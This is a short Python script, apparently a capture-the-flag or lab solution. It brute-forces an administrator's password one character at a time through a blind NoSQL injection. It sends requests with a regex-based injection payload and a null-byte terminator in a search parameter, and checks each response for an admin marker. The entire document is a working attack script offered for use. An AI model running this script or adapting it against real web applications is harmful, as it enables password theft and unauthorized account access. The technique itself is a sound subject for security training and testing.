#!/usr/bin/python 

import requests
from string import digits

password = ""
for i in 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx':
    for l in '-abcdefghijklmnopqrstuvwxyz'+digits:
        print ('Trying ' + password + l)
        url = "{URL here}/?search=admin%27%20%26%26%20this.password.match(/^"+password+l+".*$/)%00"
        print (url)
        r = requests.get(url)
        if ">admin<" in r.text:
            print ('OK!')
            password += l
            print (password)
